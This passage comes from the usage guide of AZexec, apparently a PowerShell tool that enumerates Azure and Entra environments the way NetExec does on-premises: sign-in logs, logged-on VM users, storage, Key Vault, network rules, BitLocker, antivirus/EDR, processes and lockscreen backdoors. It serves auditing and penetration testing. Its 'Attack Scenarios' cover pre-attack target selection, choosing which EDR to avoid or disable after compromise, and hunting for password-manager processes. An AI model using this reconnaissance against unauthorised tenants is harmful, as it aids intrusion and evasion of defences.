.\azx.ps1 sessions
```

**Output Shows:**
- Recent sign-in events (last 24 hours)
- User principal names and display names
- Success/failure status
- Device information (name, OS, browser)
- IP addresses and geographic locations
- Application accessed
- MFA status
- Risk levels (if Identity Protection is enabled)

### Example 29-sessions-b: Target Specific User
Enumerate sessions for a specific user:
```powershell
.\azx.ps1 sessions -Username alice@targetcorp.com
```

**Use Case**: Track sign-in activity for a compromised or suspicious account.

### Example 29-sessions-c: Export Sessions to CSV
Export all session data for analysis:
```powershell
.\azx.ps1 sessions -ExportPath sessions.csv
```

### Example 29-sessions-d: Export to JSON with Full Details
Export with complete session metadata:
```powershell
.\azx.ps1 sessions -ExportPath sessions.json
```

### Example 29-sessions-e: Query Extended Time Range (7 Days)
Query sign-in events for the last 7 days:
```powershell
.\azx.ps1 sessions -Hours 168
```

**Note**: Free Azure AD retains logs for 7 days, Premium P1/P2 for 30 days.

### Example 29-sessions-f: Query Maximum Time Range (30 Days)
Query sign-in events for the last 30 days (requires Premium license):
```powershell
.\azx.ps1 sessions -Hours 720
```

### Example 29-sessions-g: Targeted Long-Term Investigation
Investigate specific user over extended period:
```powershell
.\azx.ps1 sessions -Username alice@targetcorp.com -Hours 168 -ExportPath alice_7day_activity.csv
```

**Use Case**: Track user activity patterns over a week for incident response or insider threat investigation.

### Example 29-sessions-h: Short-Term Real-Time Monitoring
Query only recent sign-ins (last hour):
```powershell
.\azx.ps1 sessions -Hours 1
```

**Use Case**: Monitor active sessions during an ongoing incident or during a penetration test.

**What Sessions Shows:**

| Information | Description | Security Value |
|------------|-------------|----------------|
| **Timestamp** | When the sign-in occurred | Timeline for incident response |
| **User** | UserPrincipalName | Identify compromised accounts |
| **Status** | Success/Failed | Spot brute force attempts |
| **Device Info** | Name, OS, Browser | Detect unusual devices |
| **IP Address** | Source IP | Geolocation tracking |
| **Location** | City, Country | Detect impossible travel |
| **Application** | App accessed | Identify lateral movement |
| **MFA Status** | Required/Not Required | Find MFA bypass attempts |
| **Risk Level** | Low/Medium/High | Identity Protection alerts |

**Detection Use Cases:**

| Scenario | What to Look For | Command |
|----------|-----------------|---------|
| **Compromised Account** | Multiple failed logins, unusual locations | `.\azx.ps1 sessions -Username target@corp.com` |
| **Insider Threat** | Access to unusual applications, off-hours activity | `.\azx.ps1 sessions` (review all users) |
| **Brute Force Detection** | Many failed login attempts from same IP | `.\azx.ps1 sessions -ExportPath logs.csv` (analyze in Excel) |
| **Impossible Travel** | Sign-ins from different countries within short time | Review location data in exported results |
| **MFA Bypass** | Successful logins without MFA where it should be required | Check MFA status in output |

**Azure Equivalent to qwinsta:**

Traditional `qwinsta` shows who's logged into a Windows machine locally. In Azure/cloud environments, this translates to:
- **Sign-in logs** = Active authentication sessions
- **IP address** = Remote connection source
- **Device info** = Client machine details
- **Application** = What service/resource was accessed

**Time Range Configuration:**
- Default: Last 24 hours (`-Hours 24`)
- Configurable: Use `-Hours` parameter (e.g., `-Hours 168` for 7 days)
- Azure AD log retention:
  - **Free tier**: 7 days (max `-Hours 168`)
  - **Premium P1/P2**: 30 days (max `-Hours 720`)

**Permission Requirements:**
- Requires `AuditLog.Read.All` permission
- Guest users typically cannot access sign-in logs
- Must be authenticated (unlike unauthenticated commands like `users` or `tenant`)

**Common Time Ranges:**
- `-Hours 1` - Last hour (real-time monitoring)
- `-Hours 24` - Last day (default)
- `-Hours 168` - Last week (7 days)
- `-Hours 720` - Last 30 days (requires Premium)

---

### Azure VM Logged-On Users Enumeration Examples (like nxc smb --logged-on-users)

**Overview:**  
This command is the Azure equivalent of enumerating logged-on users using NetExec's `--logged-on-users` flag, which leverages the **Workstation Service (wkssvc)** RPC interface on Windows. In Azure, AZexec achieves the same result by querying Azure VMs directly using VM Run Command to identify currently logged-on users, their session states, and connection details.

**NetExec Workstation Service Equivalent:**
- **On-Premises**: `nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --loggedon-users`
  - Uses Workstation Service (wkssvc) RPC calls via SMB
  - Enumerates logged-on users through Windows RPC interface
  - Requires network access and valid credentials
  
- **Azure Cloud**: `.\azx.ps1 vm-loggedon`
  - Uses Azure VM Run Command API (similar to PsExec/RPC)
  - Executes `quser` (Windows) or `who` (Linux) directly on VMs
  - Requires Azure RBAC permissions (VM Contributor or VM Command Executor)
  - Works across subscriptions and resource groups

### Example 30-vm-loggedon-a: Enumerate All VMs in Current Subscription
Query all Azure VMs for logged-on users:
```powershell
.\azx.ps1 vm-loggedon
```

**What It Does:**
- Enumerates all VMs in the current Azure subscription
- Queries logged-on users on running VMs
- Displays username, session type, state, and idle time
- Works with both Windows and Linux VMs

### Example 30-vm-loggedon-b: Target Specific Resource Group
Query VMs in a specific resource group:
```powershell
.\azx.ps1 vm-loggedon -ResourceGroup Production-RG
```

**Use Case**: Focus on production systems or specific environments to reduce scope and noise.

### Example 30-vm-loggedon-c: Query Only Running VMs
Filter to only running VMs:
```powershell
.\azx.ps1 vm-loggedon -VMFilter running
```

**Use Case**: Skip stopped VMs to speed up enumeration and focus on active systems.

### Example 30-vm-loggedon-d: Export Results to CSV
Export logged-on users to CSV for analysis:
```powershell
.\azx.ps1 vm-loggedon -ResourceGroup Prod-RG -ExportPath loggedon-users.csv
```

**Use Case**: Create reports for security audits or compliance documentation.

### Example 30-vm-loggedon-e: Query Specific Subscription
Switch to a different subscription:
```powershell
.\azx.ps1 vm-loggedon -SubscriptionId "12345678-1234-1234-1234-123456789012" -ExportPath users.json
```

**Use Case**: Multi-subscription environments or when you don't have access to the default subscription.

### Example 30-vm-loggedon-f: Comprehensive Audit with HTML Report
Generate a full HTML report:
```powershell
.\azx.ps1 vm-loggedon -ExportPath vm-users-report.html
```

**Use Case**: Create visually formatted reports for management or security teams.

**What VM-LoggedOn Shows:**

| Information | Windows VMs | Linux VMs | Security Value |
|------------|-------------|-----------|----------------|
| **VM Name** | Yes | Yes | Identify target machines |
| **Username** | Yes (via quser) | Yes (via who) | Identify active accounts |
| **Session Type** | Console/RDP | TTY/PTS | Determine connection method |
| **Session State** | Active/Disconnected | Active | Current session status |
| **Idle Time** | Yes | Limited | Detect stale sessions |
| **Source IP/Host** | Limited | Yes (via who) | Track connection origin |
| **Resource Group** | Yes | Yes | Group by environment |
| **Power State** | Yes | Yes | Filter running vs stopped |

**Azure Equivalent to Workstation Service (wkssvc) Enumeration:**

NetExec's `--logged-on-users` uses the Workstation Service (wkssvc) RPC interface to enumerate logged-on users. In Azure, this translates to:

| On-Premises Method | Azure Equivalent | How It Works |
|-------------------|------------------|--------------|
| **Workstation Service (wkssvc)** | Azure VM Run Command | Remote execution via Azure Management API |
| **RPC over SMB (port 445)** | HTTPS API calls (port 443) | Azure REST API instead of SMB/RPC |
| **NetWkstaUserEnum** | `quser` (Windows) / `who` (Linux) | Direct OS-level query via Run Command |
| **Instant results** | 5-30 seconds per VM | API latency vs network speed |
| **Network-based** | Cloud API-based | No direct network access needed |

**Technical Implementation:**
- **VM Run Command** = Remote execution capability (similar to PsExec or WinRM)
- **quser (Windows)** = Query user sessions (same as Terminal Services API)
- **who (Linux)** = Query logged-on users (reads wtmp/utmp)
- **Session details** = Username, session type, state, idle time, connection source

**Key Differences from On-Premises:**

| On-Premises (netexec) | Azure (AZexec) |
|----------------------|----------------|
| Queries via SMB/RPC | Queries via Azure Run Command |
| Requires network access | Requires Azure RBAC permissions |
| Instant (network speed) | ~5-30 seconds per VM (API latency) |
| No authentication (null session) | Requires Azure authentication |
| Registry enumeration | Direct OS query (quser/who) |

**Permission Requirements:**
- **Virtual Machine Contributor** role (full VM access) OR
- **Reader** role + **Virtual Machine Command Executor** role (minimal)
- VMs must have Guest Agent installed and running
- VMs must be in 'running' state to query users

**Common Use Cases:**

| Scenario | What to Look For | Command |
|----------|-----------------|---------|
| **Privileged Session Discovery** | Domain admins, local admins logged on | `.\azx.ps1 vm-loggedon -ExportPath users.csv` (filter in Excel) |
| **Stale Session Detection** | High idle times, disconnected sessions | Review idle time column in output |
| **Lateral Movement Tracking** | Same user on multiple VMs | Export and correlate usernames |
| **Incident Response** | Active sessions during compromise window | Cross-reference with sign-in logs (`sessions` command) |
| **Compliance Audit** | Who has access to production systems | `.\azx.ps1 vm-loggedon -ResourceGroup Prod-RG -ExportPath audit.html` |

**Troubleshooting Common Issues:**

| Error | Cause | Solution |
|-------|-------|----------|
| **Authorization failed** | Missing permissions | Grant 'Virtual Machine Contributor' or 'VM Command Executor' role |
| **VM agent not running** | Guest Agent not installed | Install Azure VM Agent on the VM |
| **Query timeout** | VM unresponsive or network issues | Check VM status and network connectivity |
| **No users logged on** | VM running but no active sessions | Normal - VM has no interactive users |

**Integration with Other Commands:**

```powershell
# Step 1: Find VMs with logged-on users
.\azx.ps1 vm-loggedon -ExportPath vm-users.csv

# Step 2: Correlate with Azure AD sign-in logs
.\azx.ps1 sessions -Hours 24 -ExportPath signin-logs.csv

# Step 3: Check for privileged accounts
.\azx.ps1 roles -ExportPath roles.csv

# Step 4: Cross-reference to find privileged users with active VM sessions
# (Analyze CSV files to correlate data)
```

**Security Value:**
- **Attack Surface Mapping**: Identify where privileged accounts are logged in
- **Lateral Movement Detection**: Track account usage across VMs
- **Incident Response**: Quickly identify active sessions during investigation
- **Compliance**: Document who has access to sensitive systems
- **Session Hygiene**: Find and terminate stale or unauthorized sessions

---

### Azure Storage Account Enumeration Examples (Multi-Subscription)

### Example 31-storage-a: Enumerate All Storage Accounts
Enumerate storage accounts across ALL accessible subscriptions:
```powershell
.\azx.ps1 storage-enum
```

**Output Shows:**
- Storage account name, resource group, location
- Security risk level (HIGH/MEDIUM/LOW)
- Security issues (public access, HTTPS, TLS, network rules)
- Blob, File, Table, Queue endpoints

### Example 31-storage-b: Target Specific Subscription
Enumerate storage accounts in a specific subscription:
```powershell
.\azx.ps1 storage-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
```

### Example 31-storage-c: Filter by Resource Group
Enumerate storage accounts in a specific resource group:
```powershell
.\azx.ps1 storage-enum -ResourceGroup Production-RG
```

### Example 31-storage-d: Export Security Audit Report
Generate HTML report for security audit:
```powershell
.\azx.ps1 storage-enum -ExportPath storage-security-audit.html
```

**What storage-enum Checks:**

| Check | Risk Level | Description |
|-------|-----------|-------------|
| **Blob Public Access** | HIGH | Storage accounts allowing public blob access |
| **HTTPS-Only Disabled** | MEDIUM | Storage accounts not requiring HTTPS |
| **Network Default: Allow** | MEDIUM | Storage accounts allowing all network access |
| **TLS Version < 1.2** | LOW | Storage accounts with older TLS versions |
| **Shared Key Access** | LOW | Storage accounts allowing shared key auth |

---

### Azure Key Vault Enumeration Examples (Multi-Subscription)

### Example 32-keyvault-a: Enumerate All Key Vaults
Enumerate Key Vaults across ALL accessible subscriptions:
```powershell
.\azx.ps1 keyvault-enum
```

**Output Shows:**
- Key Vault name, resource group, location
- Vault URI
- Security settings (soft delete, purge protection, RBAC)
- Access policy count
- Risk level and security issues

### Example 32-keyvault-b: Target Specific Subscription with Export
Enumerate Key Vaults in a specific subscription and export to JSON:
```powershell
.\azx.ps1 keyvault-enum -SubscriptionId "12345678-1234-1234-1234-123456789012" -ExportPath keyvaults.json
```

### Example 32-keyvault-c: Security Audit with HTML Report
Generate comprehensive security audit report:
```powershell
.\azx.ps1 keyvault-enum -ExportPath keyvault-security-audit.html
```

**What keyvault-enum Checks:**

| Check | Risk Level | Description |
|-------|-----------|-------------|
| **Public Network Access** | MEDIUM | Key Vaults with public network access enabled |
| **Soft Delete Disabled** | MEDIUM | Key Vaults without soft delete protection |
| **Purge Protection Disabled** | LOW | Key Vaults without purge protection |
| **RBAC Disabled** | LOW | Key Vaults using access policies instead of RBAC |
| **Many Access Policies** | INFO | Key Vaults with >10 access policies |

---

### Azure Network Enumeration Examples (Multi-Subscription)

### Example 33-network-a: Enumerate All Network Resources
Enumerate network resources across ALL accessible subscriptions:
```powershell
.\azx.ps1 network-enum
```

**Resources Enumerated:**
- Virtual Networks (VNets) - address spaces, subnets, peerings
- Network Security Groups (NSGs) - rules, risky inbound rules
- Public IP Addresses - allocation, association status
- Load Balancers - frontend IPs, backend pools

### Example 33-network-b: Target Specific Subscription
Enumerate network resources in a specific subscription:
```powershell
.\azx.ps1 network-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
```

### Example 33-network-c: Filter by Resource Group with CSV Export
Enumerate network resources in a specific resource group:
```powershell
.\azx.ps1 network-enum -ResourceGroup Production-RG -ExportPath network-audit.csv
```

### Example 33-network-d: Generate HTML Security Report
Generate comprehensive network security report:
```powershell
.\azx.ps1 network-enum -ExportPath network-security-report.html
```

**What network-enum Checks:**

| Check | Risk Level | Description |
|-------|-----------|-------------|
| **Risky NSG Inbound Rules** | HIGH | Open ports (22, 3389, 445, 135, 1433, etc.) from Internet/Any |
| **Unassociated Public IPs** | MEDIUM | Public IPs not associated with any resource |
| **VNet Peerings** | INFO | Virtual network peering configurations |

**Security Recommendations:**
- Review and restrict NSG rules allowing traffic from Any/Internet
- Use Just-In-Time VM Access for management ports (22, 3389)
- Consider using Azure Bastion instead of public IPs for VM access
- Implement network segmentation using NSGs and ASGs

---

### BitLocker Enumeration Examples (like nxc smb -M bitlocker)

### Example 34-bitlocker-a: Enumerate BitLocker on All Windows Devices
Enumerate BitLocker encryption status on Intune-managed devices AND Azure VMs:
```powershell
.\azx.ps1 bitlocker-enum
```

**Section 1: Intune-Managed Devices** (laptops, desktops enrolled in Intune)
- Device encryption status (isEncrypted property)
- Device compliance state
- Lists specific devices needing BitLocker

**Section 2: Azure VMs** (IaaS virtual machines in Azure)
- BitLocker volume status (FullyEncrypted, FullyDecrypted, EncryptionInProgress)
- Encryption percentage (0-100%)
- Encryption method (XTS-AES 256/128, AES-CBC 256/128)
- Protection status (On/Off)
- Key protector types (TPM, RecoveryPassword, etc.)
- Volume capacity and lock status

**Example Output (Intune Section):**
```
[*] SECTION 1: INTUNE-MANAGED DEVICES
[+] Found 12 Windows devices in Intune

AZR  5905c343-84f7-  443  LS-LPT-05  [*] BitLocker ENABLED | Compliance: compliant
AZR  b15754a0-0a2b-  443  LS-MCD-01  [*] NOT ENCRYPTED | Compliance: noncompliant

[*] Intune Device Summary:
    Total Windows Devices: 12
    BitLocker Enabled: 11
    NOT Encrypted: 1

[!] Devices without BitLocker:
    → LS-MCD-01
```

### Example 34-bitlocker-b: Target Specific Subscription
Enumerate BitLocker status in a specific subscription:
```powershell
.\azx.ps1 bitlocker-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
```

### Example 34-bitlocker-c: Filter by Resource Group
Enumerate BitLocker status in a specific resource group:
```powershell
.\azx.ps1 bitlocker-enum -ResourceGroup Production-RG
```

### Example 34-bitlocker-d: Export to CSV for Compliance Reporting
Generate CSV report of BitLocker encryption status:
```powershell
.\azx.ps1 bitlocker-enum -ExportPath bitlocker-compliance.csv
```

**CSV includes:**
- **Intune Devices**: Device name, Azure AD Device ID, isEncrypted, compliance state, user, last sync
- **Azure VMs**: Subscription, resource group, VM name, location, size, power state
- **Volumes (VMs)**: Mount point, volume status, encryption percentage, encryption method, protection status, key protector types, risk level

### Example 34-bitlocker-e: Filter Running VMs Only (Default)
Query only running VMs (stopped VMs cannot be queried):
```powershell
.\azx.ps1 bitlocker-enum -VMFilter running  # Default behavior
```

### Example 34-bitlocker-f: Generate JSON Report with Full Details
Export detailed BitLocker status to JSON:
```powershell
.\azx.ps1 bitlocker-enum -ExportPath bitlocker-audit.json
```

**What bitlocker-enum Checks:**

| Check | Risk Level | Description |
|-------|-----------|-------------|
| **Volume Not Encrypted** | HIGH | Volume has no BitLocker encryption (data at rest exposed) |
| **Protection Disabled** | MEDIUM | Volume encrypted but BitLocker protection is disabled |
| **Weak Encryption Method** | MEDIUM | Using AES-CBC instead of XTS-AES |
| **Password-Only Key Protector** | LOW | No TPM protection, password-only key protector |
| **Encryption In Progress** | INFO | Volume is currently being encrypted |

**Security Recommendations:**
- Enable BitLocker on all unencrypted volumes (HIGH PRIORITY)
- Use strong encryption methods (XTS-AES 256)
- Store recovery keys in Azure Key Vault
- Enable automatic BitLocker encryption via Azure Policy
- Consider using Azure Disk Encryption (ADE) for platform-level encryption
- Implement TPM-based key protectors instead of password-only

**NetExec Comparison:**
```bash
# NetExec (On-Premises)
nxc smb 192.168.1.0/24 -u administrator -p 'Password1' -M bitlocker

# AZexec (Azure)
.\azx.ps1 bitlocker-enum
```

Both provide the same encryption status information for Windows systems.

---

### Anti-Virus & EDR Enumeration Examples (like nxc smb -M enum_av)

### Example 35-av-a: Enumerate Security Products on All Devices
Enumerate antivirus and EDR products across all Azure/Entra devices:
```powershell
.\azx.ps1 av-enum
```

**What's Enumerated:**
- Antivirus/Antimalware products (Microsoft Defender, third-party AV)
- Antivirus status (enabled/disabled) and version information
- EDR/XDR solutions (Microsoft Defender for Endpoint)
- MDE onboarding status (Onboarded, Not Onboarded, Healthy, Unhealthy)
- Firewall status (enabled/disabled)
- Encryption status (BitLocker enabled/disabled)
- Device compliance state (Compliant/Non-Compliant)
- Security risk scores (High/Medium/Low)

**Example Output:**
```
AZR             a1b2c3d4-5678...    443    DESKTOP-WIN10-PROD             [*] AV:Microsoft Defender(enabled) v1.403.3761.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | FW:Enabled | Encryption:BitLocker Enabled
AZR             f9e8d7c6-5432...    443    LAPTOP-FINANCE-01              [*] AV:Unknown(disabled) | EDR:None | MDE:Not Onboarded | FW:DISABLED | Encryption:Unknown
AZR             1a2b3c4d-9876...    443    SERVER-IT-MGMT                 [*] AV:Microsoft Defender(enabled) v1.403.3761.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(unhealthy) | FW:Enabled | Encryption:BitLocker Enabled
```

**Color Coding:**
- 🟢 **Green**: Good security posture (AV enabled, MDE onboarded, firewall enabled)
- 🟡 **Yellow**: Warnings (AV enabled but MDE unhealthy or firewall disabled)
- 🔴 **Red**: Critical security gaps (No AV, no MDE, firewall disabled)

### Example 35-av-b: Filter Windows Devices Only
Focus on Windows devices (most relevant for AV/EDR):
```powershell
.\azx.ps1 av-enum -Filter windows
```

### Example 35-av-c: Identify Non-Compliant Devices
Find devices with security compliance issues:
```powershell
.\azx.ps1 av-enum -Filter noncompliant
```

### Example 35-av-d: Export Security Posture Report to CSV
Generate CSV report of all device security posture:
```powershell
.\azx.ps1 av-enum -ExportPath security-posture.csv
```

**CSV includes:**
- Device ID, name, OS, OS version, trust type
- Antivirus product, status, version
- EDR product and status
- MDE onboarding status and health
- Firewall status
- Encryption status
- Compliance state
- Risk score (High/Medium/Low)

### Example 35-av-e: Generate HTML Security Dashboard
Create comprehensive HTML report with statistics and risk analysis:
```powershell
.\azx.ps1 av-enum -ExportPath security-dashboard.html
```

**HTML report includes:**
- Visual statistics dashboard
- Security posture summary
- Color-coded risk indicators
- Device-by-device security details
- Actionable security recommendations

### Example 35-av-f: Identify Critical Security Gaps
Find devices with disabled antivirus or firewall:
```powershell
.\azx.ps1 av-enum | Out-File security-gaps.txt
# Review output for RED colored entries (critical security gaps)
```

**What av-enum Checks:**

| Check | Risk Level | Description |
|-------|-----------|-------------|
| **Antivirus Disabled** | HIGH | No active antivirus protection (malware exposure) |
| **Firewall Disabled** | HIGH | Windows Firewall disabled (network exposure) |
| **MDE Not Onboarded** | MEDIUM | Not enrolled in Microsoft Defender for Endpoint |
| **MDE Unhealthy** | MEDIUM | MDE onboarded but health check failed |
| **No Encryption** | MEDIUM | BitLocker not enabled (data at rest exposure) |
| **Device Non-Compliant** | MEDIUM | Failed compliance policy checks |
| **High Risk Score** | HIGH | Microsoft 365 Defender assigned high risk score |

**Summary Statistics Example:**
```
[*] Security Posture Summary:
    Total Devices: 22
    Microsoft Defender for Endpoint (MDE):
      • Onboarded: 12
      • Healthy: 12
    Antivirus/Antimalware:
      • Enabled: 18
      • DISABLED: 4
    Firewall:
      • Enabled: 0
      • Disabled: 0
    Encryption:
      • Encrypted: 17

[*] Security Recommendations:
    [!] 4 devices have DISABLED antivirus - HIGH RISK!
        → gkarpouzas_AndroidForWork_5/19/2025_5:54 AM
        → Thanasis's MacBook Pro
        → samsungSM-S908B
        → DESKTOP-PBLFO5I
    [!] 1 Windows devices NOT onboarded to Microsoft Defender for Endpoint
        → DESKTOP-PBLFO5I
        Consider onboarding to MDE for enhanced threat protection
    [!] 2 Windows devices NOT encrypted (BitLocker)
        → LS-MCD-01
        → DESKTOP-PBLFO5I
        Enable BitLocker to protect data at rest
```

**Note:** MDE and BitLocker recommendations only list Windows devices since these are Windows-specific security features. Non-Windows devices (iOS, Android, macOS) are excluded from these recommendations.

**Security Recommendations:**
- Enable antivirus on all devices (HIGH PRIORITY)
- Onboard all devices to Microsoft Defender for Endpoint (MDE)
- Enable Windows Firewall on all devices
- Enable BitLocker encryption for data at rest protection
- Implement device compliance policies via Microsoft Intune
- Configure automatic threat remediation in MDE
- Review and remediate high-risk devices immediately

**Required Permissions:**
```powershell
# Minimum (basic device enumeration):
Device.Read.All

# Recommended (full security posture):
Device.Read.All
DeviceManagementManagedDevices.Read.All       # For Intune data, BitLocker status (requires admin consent)
DeviceManagementConfiguration.Read.All        # For device compliance, encryption policies
SecurityEvents.Read.All                        # For MDE status (requires admin consent)
```

**Detection Methods Used:**
- **Windows Protection State API** (`/deviceManagement/managedDevices/{id}/windowsProtectionState`) - Most reliable for Intune-enrolled devices
- **Microsoft 365 Defender API** - For advanced MDE health status
- **Intune Managed Device Properties** - For `isEncrypted` (BitLocker) status

**Note:** Some permissions require **admin consent**. If you don't see MDE or BitLocker data, an admin may need to grant consent for the application.

**NetExec Comparison:**
```bash
# NetExec (On-Premises)
nxc smb 192.168.1.0/24 -u administrator -p 'Password1' -M enum_av

# Output example:
# SMB  192.168.1.10  445  DC01  [*] Windows Defender: enabled, updated
# SMB  192.168.1.20  445  WS01  [*] Kaspersky Endpoint Security: enabled
# SMB  192.168.1.30  445  WS02  [!] No antivirus detected!

# AZexec (Azure)
.\azx.ps1 av-enum

# Output example:
# AZR  7b67c060-eb92-4  443  LS-LPT-06  [*] AV:Microsoft Defender(enabled) v1.443.147.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | Encryption:BitLocker Enabled
# AZR  5b397631-d32c-4  443  DESKTOP-PBLFO5I  [*] AV:Unknown(disabled) | MDE:Not Onboarded
# AZR  53d543a0-b709-4  443  Thanasis's MacBook Pro  [*] AV:Unknown(disabled) | MDE:Not Onboarded
```

Both enumerate security products, but AZexec provides additional cloud-native security information:
- Microsoft Defender for Endpoint onboarding status
- Device compliance policies from Intune
- Security risk scores from Microsoft 365 Defender
- Encryption status via device health attestation

**Attack Scenarios:**

**Scenario 1: Identify Vulnerable Targets**
```powershell
# Find devices without proper security controls
.\azx.ps1 av-enum -Filter noncompliant -ExportPath vulnerable-targets.csv

# Review CSV for:
# - Disabled antivirus (easy malware deployment)
# - No MDE onboarding (no EDR detection)
# - Disabled firewall (easy lateral movement)
# - No encryption (credential theft if device stolen)
```

**Scenario 2: Map Security Coverage**
```powershell
# Generate comprehensive security report
.\azx.ps1 av-enum -ExportPath security-map.html

# Use HTML report to:
# - Identify security gaps across the organization
# - Prioritize remediation efforts (HIGH risk devices first)
# - Track security posture improvement over time
```

**Scenario 3: Pre-Attack Reconnaissance**
```powershell
# Identify targets with weak security posture for initial access
.\azx.ps1 av-enum | Select-String "DISABLED"

# Look for:
# - AV disabled (phishing/malware delivery targets)
# - FW disabled (network exploitation targets)
# - MDE not onboarded (no EDR alerting)
```

**Scenario 4: Post-Compromise Coverage Assessment**
```powershell
# After gaining access, assess detection capabilities
.\azx.ps1 av-enum -ExportPath security-coverage.json

# Analyze:
# - Which devices have EDR (avoid or disable)
# - Which devices lack security controls (easy targets)
# - Overall security maturity of the environment
```

---

### Process Enumeration: `process-enum`

The Azure equivalent of NetExec's `--tasklist` command. Enumerate running processes on Azure VMs:

```powershell
# Enumerate all processes on all Azure VMs (like nxc smb --tasklist)
.\azx.ps1 process-enum

# Filter by process name (like nxc smb --tasklist keepass.exe)
.\azx.ps1 process-enum -ProcessName "keepass.exe"

# Target specific subscription or resource group
.\azx.ps1 process-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
.\azx.ps1 process-enum -ResourceGroup Production-RG

# Filter by VM power state (default: running only)
.\azx.ps1 process-enum -VMFilter running
.\azx.ps1 process-enum -VMFilter all

# Export results to CSV/JSON
.\azx.ps1 process-enum -ExportPath processes.csv
.\azx.ps1 process-enum -ExportPath processes.json
```

**Information Enumerated**:
- **Process Name** - Executable name (e.g., `notepad.exe`, `python`)
- **Process ID (PID)** - Unique process identifier
- **Memory Usage** - Current memory consumption
- **CPU Usage** - Current CPU percentage (Linux only)
- **User** - User account running the process
- **Session** - Session identifier (Windows only)
- **Command Line** - Full command line arguments (Linux only)

**NetExec Comparison**:

| NetExec Command | AZexec Equivalent | Description |
|-----------------|-------------------|-------------|
| `nxc smb 192.168.1.0/24 -u admin -p pass --tasklist` | `.\azx.ps1 process-enum` | Enumerate all processes |
| `nxc smb 192.168.1.0/24 -u admin -p pass --tasklist keepass.exe` | `.\azx.ps1 process-enum -ProcessName "keepass.exe"` | Filter by process name |
| NetExec queries via SMB/WMI on remote Windows hosts | AZexec queries via Azure VM Run Command | Cloud vs On-Prem |

**How It Works**:
- Uses Azure VM Run Command (same as `vm-loggedon` command)
- Windows VMs: Executes `tasklist` command (equivalent to NetExec's SMB query)
- Linux VMs: Executes `ps aux` command (process list with details)
- Requires **Virtual Machine Contributor** or **VM Command Executor** role
- Queries are logged in Azure Activity Logs (audit trail)
- Supports both Windows and Linux VMs

**Use Cases**:

| Scenario | Description | Command |
|----------|-------------|---------|
| **Credential Hunting** | Find password managers (KeePass, LastPass, etc.) | `.\azx.ps1 process-enum -ProcessName "keepass"` |
| **Malware Detection** | Identify suspicious processes | `.\azx.ps1 process-enum -ExportPath processes.csv` (analyze in Excel) |
| **Lateral Movement** | Find processes running as privileged users | Filter CSV for processes with admin users |
| **Incident Response** | Document running processes during compromise | `.\azx.ps1 process-enum -VMFilter running -ExportPath incident-processes.json` |
| **Compliance Audit** | Verify approved software only | Compare process list against approved software inventory |

**Example Output**:
```
[*] AZX - Remote Process Enumeration
[*] Command: process-enum (Similar to: nxc smb --tasklist)
[*] Azure equivalent of NetExec's remote process enumeration

[*] VM: web-server-01
    Resource Group: Production-RG
    OS Type: Windows
    Power State: running
    [*] Querying processes...
    [+] Found 45 process(es):
AZR         web-server-01  443     System                          [*] PID:4 MEM:1,234 K SESSION:Services USER:System
AZR         web-server-01  443     svchost.exe                     [*] PID:1234 MEM:45,678 K SESSION:Services USER:SYSTEM
AZR         web-server-01  443     keepass.exe                      [*] PID:5678 MEM:12,345 K SESSION:Console USER:admin
```

**Troubleshooting**:
- **"VM is not in running state"**: Process enumeration only works on running VMs. Use `-VMFilter running` to skip stopped VMs.
- **"AuthorizationFailed"**: Ensure you have `Virtual Machine Contributor` or `VM Command Executor` role assigned.
- **"No processes found"**: The process name filter may be too restrictive. Try without `-ProcessName` to see all processes.

---

### Lockscreen Backdoor Enumeration: `lockscreen-enum`

The Azure equivalent of NetExec's `-M lockscreendoors` module. Detect when Windows accessibility executables have been replaced with backdoors:

```powershell
# Detect lockscreen backdoors on all Azure VMs (like nxc smb -M lockscreendoors)
.\azx.ps1 lockscreen-enum

# Check only running VMs
.\azx.ps1 lockscreen-enum -VMFilter running

# Target specific subscription or resource group
.\azx.ps1 lockscreen-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
.\azx.ps1 lockscreen-enum -ResourceGroup Production-RG

# Export results to file
.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.csv
.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.html
```

**What is a Lockscreen Backdoor?**

Attackers can replace Windows accessibility executables with cmd.exe or powershell.exe to gain SYSTEM access from the lock screen without authentication. These executables can be triggered from the Windows lock screen:

| Executable | Trigger | Description |
|------------|---------|-------------|
| `utilman.exe` | Win+U | Ease of Access utility |
| `sethc.exe` | 5x Shift | Sticky Keys |
| `narrator.exe` | Win+Enter | Narrator screen reader |
| `osk.exe` | On-Screen Keyboard button | On-Screen Keyboard |
| `magnify.exe` | Win++ | Magnifier |
| `EaseOfAccessDialog.exe` | Ease of Access menu | Ease of Access Dialog |
| `displayswitch.exe` | Win+P | Display Switch |
| `atbroker.exe` | Assistive Technology | Assistive Technology Service |
| `voiceaccess.exe` | Voice commands | Windows Voice Access |

**Detection Logic**:
- **CLEAN**: FileDescription matches expected accessibility tool name
- **SUSPICIOUS**: FileDescription differs from expected value (could be legitimate update or modification)
- **BACKDOORED**: FileDescription is "Windows PowerShell" or "Windows Command Processor" (definite compromise)

**NetExec Comparison**:

| NetExec Command | AZexec Equivalent | Description |
|-----------------|-------------------|-------------|
| `nxc smb 192.168.1.0/24 -u admin -p pass -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | Detect accessibility backdoors |
| NetExec checks via SMB/WMI on remote Windows hosts | AZexec checks via Azure VM Run Command | Cloud vs On-Prem |

**How It Works**:
- Uses Azure VM Run Command to execute PowerShell on Windows VMs
- Reads FileDescription metadata from each accessibility executable using `[System.Diagnostics.FileVersionInfo]`
- Compares against expected descriptions for accessibility tools
- Flags executables with cmd.exe or PowerShell descriptions as **BACKDOORED**
- Windows VMs only (Linux VMs are automatically skipped)

**Example Output**:
```
[*] AZX - Lockscreen Backdoor Enumeration
[*] Command: lockscreen-enum (Similar to: nxc smb -M lockscreendoors)
[*] Azure equivalent of NetExec's lockscreendoors module

[*] VM: web-server-01
    Resource Group: Production-RG
    OS Type: Windows
    Power State: running
    [*] Checking accessibility executables...
